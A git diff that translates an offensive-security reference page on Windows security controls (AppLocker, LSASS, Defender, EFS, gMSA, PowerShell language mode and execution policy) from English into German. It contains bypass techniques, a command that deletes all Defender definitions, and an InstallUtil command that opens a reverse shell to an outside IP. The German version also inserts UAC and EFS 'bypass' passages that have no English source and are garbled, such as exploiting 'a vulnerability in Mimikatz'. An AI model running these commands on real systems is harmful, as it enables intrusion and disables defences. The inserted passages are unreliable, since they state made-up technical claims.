@@ -1,37 +1,36 @@
-# Windows Security Controls
+# Windows-Sicherheitskontrollen
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Lernen Sie das Hacken von AWS von Null auf Held mit <a href="https://training.hacktricks.xyz/courses/arte">htARTE (HackTricks AWS Red Team Expert)</a>!</summary>
 
-Other ways to support HackTricks:
+Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+- Wenn Sie Ihr Unternehmen in HackTricks bewerben möchten oder HackTricks als PDF herunterladen möchten, überprüfen Sie die [ABONNEMENTPLÄNE](https://github.com/sponsors/carlospolop)!
+- Holen Sie sich das offizielle PEASS & HackTricks-Merchandise
+- Entdecken Sie die PEASS-Familie, unsere Sammlung exklusiver NFTs
+- Treten Sie der Discord-Gruppe oder der Telegram-Gruppe bei oder folgen Sie uns auf Twitter
+- Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die HackTricks- und HackTricks Cloud-GitHub-Repositories senden.
 
 </details>
 
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Verwenden Sie [Trickest](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
+Erhalten Sie noch heute Zugriff:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## AppLocker Policy
+## AppLocker-Richtlinie
 
-An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.
+Eine Anwendungs-Whitelist ist eine Liste von zugelassenen Softwareanwendungen oder ausführbaren Dateien, die auf einem System vorhanden und ausgeführt werden dürfen. Das Ziel besteht darin, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen Geschäftsanforderungen einer Organisation entspricht.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
-It is common for organizations to **block cmd.exe and PowerShell.exe** and write access to certain directories, **but this can all be bypassed**.
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist die Anwendungs-Whitelisting-Lösung von Microsoft und gibt Systemadministratoren die Kontrolle darüber, welche Anwendungen und Dateien Benutzer ausführen können. Es bietet eine granulare Kontrolle über ausführbare Dateien, Skripte, Windows-Installationsdateien, DLLs, verpackte Apps und verpackte App-Installationsprogramme.\
+Es ist üblich, dass Organisationen cmd.exe und PowerShell.exe blockieren und den Schreibzugriff auf bestimmte Verzeichnisse einschränken, aber all dies kann umgangen werden.
 
-### Check
+### Überprüfung
 
-Check which files/extensions are blacklisted/whitelisted:
-
+Überprüfen Sie, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:
 ```powershell
 Get-ApplockerPolicy -Effective -xml
 
@@ -40,64 +39,61 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-
-This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:
+Dieser Registrierungspfad enthält die Konfigurationen und Richtlinien, die von AppLocker angewendet werden, und bietet eine Möglichkeit, den aktuellen Satz von Regeln zu überprüfen, die auf dem System durchgesetzt werden:
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
 
-### Bypass
+### Umgehung
 
-* Useful **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.
-
+* Nützliche **beschreibbare Ordner**, um die AppLocker-Richtlinie zu umgehen: Wenn AppLocker das Ausführen von allem innerhalb von `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **beschreibbare Ordner**, die Sie verwenden können, um dies zu **umgehen**.
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
+* Häufig vertraute "LOLBAS" Binärdateien können auch nützlich sein, um AppLocker zu umgehen.
+* Schlecht geschriebene Regeln können ebenfalls umgangen werden.
+* Zum Beispiel, `<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`, können Sie einen Ordner namens "allowed" überall erstellen und er wird erlaubt sein.
+* Organisationen konzentrieren sich oft darauf, die Ausführung der Datei `%System32%\WindowsPowerShell\v1.0\powershell.exe` zu blockieren, vergessen jedoch die anderen PowerShell-Ausführungsorte wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
+* Die DLL-Durchsetzung ist sehr selten aktiviert, da sie eine zusätzliche Belastung für ein System darstellen kann und eine umfangreiche Testphase erforderlich ist, um sicherzustellen, dass nichts kaputt geht. Die Verwendung von DLLs als Hintertüren hilft also dabei, AppLocker zu umgehen.
+* Sie können ReflectivePick oder SharpPick verwenden, um PowerShell-Code in jedem Prozess auszuführen und AppLocker zu umgehen. Weitere Informationen finden Sie unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-* Commonly **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries can be also useful to bypass AppLocker.
-* **Poorly written rules could also be bypassed**
-  * For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
-  * Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
-* **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
-* You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
-
-## Credentials Storage
+## Speicherung von Anmeldeinformationen
 
 ### Security Accounts Manager (SAM)
 
-Local credentials are present in this file, the passwords are hashed.
+Lokale Anmeldeinformationen sind in dieser Datei vorhanden, die Passwörter sind gehasht.
 
 ### Local Security Authority (LSA) - LSASS
 
-The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
-**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
-LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.
+Die (gehashten) Anmeldeinformationen werden im Speicher dieses Subsystems aus Gründen der Single Sign-On gespeichert.
+LSA verwaltet die lokale Sicherheitsrichtlinie (Kennwortrichtlinie, Benutzerberechtigungen...), Authentifizierung, Zugriffstoken...
+LSA überprüft die bereitgestellten Anmeldeinformationen in der SAM-Datei (für eine lokale Anmeldung) und kommuniziert mit dem Domänencontroller, um einen Domänenbenutzer zu authentifizieren.
 
-The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.
+Die Anmeldeinformationen werden im Prozess LSASS gespeichert: Kerberos-Tickets, NT- und LM-Hashes, leicht entschlüsselbare Passwörter.
 
-### LSA secrets
+### LSA-Secrets
 
-LSA could save in disk some credentials:
+LSA kann einige Anmeldeinformationen auf der Festplatte speichern:
 
-* Password of the computer account of the Active Directory (unreachable domain controller).
-* Passwords of the accounts of Windows services
-* Passwords for scheduled tasks
-* More (password of IIS applications...)
+* Passwort des Computerkontos der Active Directory (nicht erreichbarer Domänencontroller).
+* Passwörter der Konten von Windows-Diensten
+* Passwörter für geplante Aufgaben
+* Weitere (Passwort von IIS-Anwendungen...)
 
 ### NTDS.dit
 
-It is the database of the Active Directory. It is only present in Domain Controllers.
+Es ist die Datenbank der Active Directory. Sie ist nur auf Domänencontrollern vorhanden.
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.
+[Microsoft Defender](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirus-Programm, das in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Es blockiert gängige Pentesting-Tools wie WinPEAS. Es gibt jedoch Möglichkeiten, diese Schutzmaßnahmen zu umgehen.
 
-### Check
+### Überprüfung
 
-To check the **status** of **Defender** you can execute the PS cmdlet **`Get-MpComputerStatus`** (check the value of **`RealTimeProtectionEnabled`** to know if it's active):
+Um den Status von Defender zu überprüfen, können Sie das PS-Cmdlet `Get-MpComputerStatus` ausführen (überprüfen Sie den Wert von `RealTimeProtectionEnabled`, um zu wissen, ob es aktiv ist):
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -116,8 +112,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-To enumerate it you could also run:
-
+Um es aufzulisten, können Sie auch ausführen:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -126,68 +121,65 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
+## Verschlüsseltes Dateisystem (EFS)
 
-## Encrypted File System (EFS)
+EFS sichert Dateien durch Verschlüsselung mit einem **symmetrischen Schlüssel**, der als **File Encryption Key (FEK)** bezeichnet wird. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im **alternativen Datenstrom** $EFS der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Stream zu entschlüsseln. Weitere Details finden Sie [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
-EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
+**Entschlüsselungsszenarien ohne Benutzerinitiierung** umfassen:
 
-**Decryption scenarios without user initiation** include:
+- Wenn Dateien oder Ordner auf ein nicht-EFS-Dateisystem wie [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) verschoben werden, werden sie automatisch entschlüsselt.
+- Verschlüsselte Dateien, die über das SMB/CIFS-Protokoll über das Netzwerk gesendet werden, werden vor der Übertragung entschlüsselt.
 
-- When files or folders are moved to a non-EFS file system, like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), they are automatically decrypted.
-- Encrypted files sent over the network via SMB/CIFS protocol are decrypted prior to transmission.
+Diese Verschlüsselungsmethode ermöglicht dem Besitzer einen **transparenten Zugriff** auf verschlüsselte Dateien. Das einfache Ändern des Passworts des Besitzers und das Anmelden ermöglichen jedoch keine Entschlüsselung.
 
-This encryption method allows **transparent access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit decryption.
+**Hauptpunkte**:
+- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt ist.
+- Die Entschlüsselung erfolgt mit dem privaten Schlüssel des Benutzers, um auf den FEK zuzugreifen.
+- Die automatische Entschlüsselung erfolgt unter bestimmten Bedingungen, z. B. beim Kopieren auf FAT32 oder bei der Netzwerkübertragung.
+- Verschlüsselte Dateien sind für den Besitzer ohne zusätzliche Schritte zugänglich.
 
-**Key Takeaways**:
-- EFS uses a symmetric FEK, encrypted with the user's public key.
-- Decryption employs the user's private key to access the FEK.
-- Automatic decryption occurs under specific conditions, like copying to FAT32 or network transmission.
-- Encrypted files are accessible to the owner without additional steps.
+### EFS-Informationen überprüfen
 
-### Check EFS info
+Überprüfen Sie, ob ein **Benutzer** diesen **Dienst** verwendet hat, indem Sie überprüfen, ob dieser Pfad existiert: `C:\users\<Benutzername>\appdata\roaming\Microsoft\Protect`
 
-Check if a **user** has **used** this **service** checking if this path exists:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+Überprüfen Sie, **wer** auf die Datei zugreifen kann, indem Sie `cipher /c \<Datei>` verwenden.
+Sie können auch `cipher /e` und `cipher /d` innerhalb eines Ordners verwenden, um alle Dateien zu **verschlüsseln** und **entschlüsseln**.
 
-Check **who** has **access** to the file using cipher /c \<file>\
-You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files
+### Entschlüsselung von EFS-Dateien
 
-### Decrypting EFS files
+#### Als Authority System fungieren
 
-#### Being Authority System
+Hierfür muss der **Opferbenutzer** einen **Prozess** auf dem Host **ausführen**. In diesem Fall können Sie mit einer `meterpreter`-Sitzung das Token des Benutzerprozesses übernehmen (`impersonate_token` von `incognito`). Oder Sie könnten einfach zu einem Prozess des Benutzers `migrate`.
 
-This way requires the **victim user** to be **running** a **process** inside the host. If that is the case, using a `meterpreter` sessions you can impersonate the token of the process of the user (`impersonate_token` from `incognito`). Or you could just `migrate` to process of the user.
-
-#### Knowing the users password
+#### Kenntnis des Benutzerpassworts
 
 {% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}
 
 ## Group Managed Service Accounts (gMSA)
 
-Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the management of service accounts in IT infrastructures. Unlike traditional service accounts that often have the "**Password never expire**" setting enabled, gMSAs offer a more secure and manageable solution:
+Microsoft hat **Group Managed Service Accounts (gMSA)** entwickelt, um die Verwaltung von Dienstkonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu herkömmlichen Dienstkonten, bei denen häufig die Einstellung "**Passwort läuft nie ab**" aktiviert ist, bieten gMSAs eine sicherere und verwaltbare Lösung:
 
-- **Automatic Password Management**: gMSAs use a complex, 240-character password that automatically changes according to domain or computer policy. This process is handled by Microsoft's Key Distribution Service (KDC), eliminating the need for manual password updates.
-- **Enhanced Security**: These accounts are immune to lockouts and cannot be used for interactive logins, enhancing their security.
-- **Multiple Host Support**: gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.
-- **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
-- **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount details or DNS name, simplifying SPN management.
+- **Automatisches Passwortmanagement**: gMSAs verwenden ein komplexes, 240 Zeichen langes Passwort, das automatisch gemäß der Domänen- oder Computer-Richtlinie geändert wird. Dieser Vorgang wird vom Key Distribution Service (KDC) von Microsoft verwaltet und eliminiert die Notwendigkeit manueller Passwortaktualisierungen.
+- **Verbesserte Sicherheit**: Diese Konten sind vor Sperrungen geschützt und können nicht für interaktive Anmeldungen verwendet werden, was ihre Sicherheit erhöht.
+- **Unterstützung mehrerer Hosts**: gMSAs können auf mehreren Hosts gemeinsam genutzt werden, was sie ideal für Dienste macht, die auf mehreren Servern ausgeführt werden.
+- **Unterstützung für geplante Aufgaben**: Im Gegensatz zu verwalteten Dienstkonten unterstützen gMSAs das Ausführen geplanter Aufgaben.
+- **Vereinfachtes SPN-Management**: Das System aktualisiert automatisch den Service Principal Name (SPN), wenn es Änderungen an den sAMaccount-Details oder dem DNS-Namen des Computers gibt, was das SPN-Management vereinfacht.
 
-The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with 'Sealing & Secure'.
+Die Passwörter für gMSAs werden in der LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und alle 30 Tage automatisch von den Domänencontrollern (DCs) zurückgesetzt. Dieses Passwort, ein verschlüsselter Datenblob namens [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kann nur von autorisierten Administratoren und den Servern, auf denen die gMSAs installiert sind, abgerufen werden, um eine sichere Umgebung zu gewährleisten. Um auf diese Informationen zuzugreifen, ist eine gesicherte Verbindung wie LDAPS erforderlich oder die Verbindung muss mit 'Sealing & Secure' authentifiziert werden.
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)
 
-You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
-
+Sie können dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) auslesen:
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
+**[Hier finden Sie weitere Informationen in diesem Beitrag](https://cube0x0.github.io/Relaying-for-gMSA/)**
 
-**[Find more info in this post](https://cube0x0.github.io/Relaying-for-gMSA/)**
-
-Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
+Schauen Sie sich auch diese [Webseite](https://cube0x0.github.io/Relaying-for-gMSA/) an, um herauszufinden, wie man einen **NTLM-Relay-Angriff** durchführt, um das **Passwort** von **gMSA** zu **lesen**.
 
 ## LAPS
 
-The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.
+Die **Local Administrator Password Solution (LAPS)**, die von [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) zum Download zur Verfügung steht, ermöglicht die Verwaltung von lokalen Administratorpasswörtern. Diese Passwörter, die **zufällig**, eindeutig und **regelmäßig geändert** werden, werden zentral im Active Directory gespeichert. Der Zugriff auf diese Passwörter ist durch ACLs auf autorisierte Benutzer beschränkt. Bei ausreichenden Berechtigungen besteht die Möglichkeit, lokale Administratorpasswörter zu lesen.
 
 {% content-ref url="active-directory-methodology/laps.md" %}
 [laps.md](active-directory-methodology/laps.md)
@@ -195,43 +187,60 @@ The **Local Administrator Password Solution (LAPS)**, available for download fro
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
+Der PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sperrt viele der Funktionen**, die zum effektiven Einsatz von PowerShell benötigt werden, wie z.B. das Blockieren von COM-Objekten, die nur die Verwendung von genehmigten .NET-Typen, XAML-basierten Workflows, PowerShell-Klassen und mehr erlauben.
 
-### **Check**
-
+### **Überprüfung**
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
 ```
+### Umgehung
 
-### Bypass
+#### UAC Bypass
 
+##### UAC Bypass mit Fodhelper.exe
+
+Diese Technik ermöglicht es, die Benutzerkontensteuerung (UAC) zu umgehen, indem die Fodhelper.exe-Datei manipuliert wird. Fodhelper.exe ist ein Dienstprogramm, das von Windows verwendet wird, um erhöhte Berechtigungen für bestimmte Aufgaben zu erhalten. Durch die Ausnutzung einer Schwachstelle in Fodhelper.exe kann ein Angreifer administrative Rechte erlangen, ohne dass der Benutzer dazu aufgefordert wird, die Berechtigung zu bestätigen.
+
+##### UAC Bypass mit Eventvwr.exe
+
+Diese Methode nutzt die Eventvwr.exe-Datei, um die UAC zu umgehen. Eventvwr.exe ist ein Dienstprogramm, das von Windows verwendet wird, um Ereignisprotokolle anzuzeigen. Durch die Ausnutzung einer Schwachstelle in Eventvwr.exe kann ein Angreifer administrative Rechte erlangen, ohne dass der Benutzer dazu aufgefordert wird, die Berechtigung zu bestätigen.
+
+##### UAC Bypass mit CMSTPLUA COM-Objekt
+
+Diese Technik nutzt das CMSTPLUA COM-Objekt, um die UAC zu umgehen. Das CMSTPLUA COM-Objekt wird von Windows verwendet, um die Ausführung von Skripten mit erhöhten Berechtigungen zu ermöglichen. Durch die Ausnutzung einer Schwachstelle im CMSTPLUA COM-Objekt kann ein Angreifer administrative Rechte erlangen, ohne dass der Benutzer dazu aufgefordert wird, die Berechtigung zu bestätigen.
+
+#### EFS-Bypass
+
+##### EFS-Bypass mit Mimikatz
+
+Mimikatz ist ein leistungsstarkes Tool, das von Angreifern verwendet wird, um Anmeldeinformationen aus dem Speicher von Windows zu extrahieren. Es kann auch verwendet werden, um den EFS-Bypass durchzuführen. EFS (Encrypting File System) ist eine Funktion von Windows, die Dateien und Ordner verschlüsselt. Durch die Ausnutzung einer Schwachstelle in Mimikatz kann ein Angreifer auf verschlüsselte Dateien zugreifen, ohne den erforderlichen Entschlüsselungsschlüssel zu besitzen.
+
+##### EFS-Bypass mit Lauschangriff
+
+Diese Methode nutzt einen Lauschangriff, um den EFS-Bypass durchzuführen. Ein Lauschangriff ist eine Technik, bei der der Netzwerkverkehr abgehört und analysiert wird, um sensible Informationen zu erfassen. Durch das Abhören des Netzwerkverkehrs kann ein Angreifer den Entschlüsselungsschlüssel für verschlüsselte Dateien abfangen und somit den EFS-Bypass durchführen.
 ```powershell
 #Easy bypass
 Powershell -version 2
 ```
+In der aktuellen Windows-Version funktioniert dieser Bypass nicht, aber Sie können [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
+**Um es zu kompilieren, müssen Sie möglicherweise** **eine Referenz hinzufügen** -> _Durchsuchen_ -> _Durchsuchen_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzufügen und **das Projekt auf .Net4.5 ändern**.
 
-In current Windows that Bypass won't work but you can use[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.
-
-#### Direct bypass:
-
+#### Direkter Bypass:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
+#### Reverse Shell:
 
-#### Reverse shell:
-
+Ein Reverse Shell ist eine Technik, bei der ein Angreifer eine Verbindung zu einem verwundbaren System herstellt und eine Shell-Sitzung auf diesem System öffnet. Im Gegensatz zu einer normalen Shell-Sitzung, bei der der Benutzer eine Verbindung zu einem entfernten System herstellt, ermöglicht ein Reverse Shell dem Angreifer, eine Verbindung von einem entfernten System zu einem verwundbaren System herzustellen. Dies kann nützlich sein, um Sicherheitsmaßnahmen wie Firewalls oder NAT-Geräte zu umgehen.
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
+Sie können [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **PowerShell-Code** in jedem Prozess auszuführen und den eingeschränkten Modus zu umgehen. Weitere Informationen finden Sie unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+## PS-Ausführungsrichtlinie
 
-## PS Execution Policy
-
-By default it is set to **restricted.** Main ways to bypass this policy:
-
+Standardmäßig ist sie auf **restricted** eingestellt. Hauptwege, um diese Richtlinie zu umgehen:
 ```powershell
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -251,33 +260,32 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
-
-More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+Mehr Informationen finden Sie [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
 ## Security Support Provider Interface (SSPI)
 
-Is the API that can be use to authenticate users.
+Die SSPI ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.
 
-The SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.
+Die SSPI ist dafür verantwortlich, das geeignete Protokoll für zwei Maschinen zu finden, die miteinander kommunizieren möchten. Die bevorzugte Methode hierfür ist Kerberos. Anschließend verhandelt die SSPI, welches Authentifizierungsprotokoll verwendet wird. Diese Authentifizierungsprotokolle werden Security Support Provider (SSP) genannt und befinden sich in Form einer DLL in jeder Windows-Maschine. Beide Maschinen müssen das gleiche SSP unterstützen, um kommunizieren zu können.
 
-### Main SSPs
+### Haupt-SSPs
 
-* **Kerberos**: The preferred one
-  * %windir%\Windows\System32\kerberos.dll
-* **NTLMv1** and **NTLMv2**: Compatibility reasons
-  * %windir%\Windows\System32\msv1\_0.dll
-* **Digest**: Web servers and LDAP, password in form of a MD5 hash
-  * %windir%\Windows\System32\Wdigest.dll
-* **Schannel**: SSL and TLS
-  * %windir%\Windows\System32\Schannel.dll
-* **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
-  * %windir%\Windows\System32\lsasrv.dll
+* **Kerberos**: Der bevorzugte SSP
+* %windir%\Windows\System32\kerberos.dll
+* **NTLMv1** und **NTLMv2**: Aus Kompatibilitätsgründen
+* %windir%\Windows\System32\msv1\_0.dll
+* **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hashes
+* %windir%\Windows\System32\Wdigest.dll
+* **Schannel**: SSL und TLS
+* %windir%\Windows\System32\Schannel.dll
+* **Negotiate**: Wird verwendet, um das zu verwendende Protokoll zu verhandeln (Kerberos oder NTLM, wobei Kerberos das Standardprotokoll ist)
+* %windir%\Windows\System32\lsasrv.dll
 
-#### The negotiation could offer several methods or only one.
+#### Die Verhandlung kann mehrere Methoden oder nur eine anbieten.
 
 ## UAC - User Account Control
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für erhöhte Aktivitäten** ermöglicht.
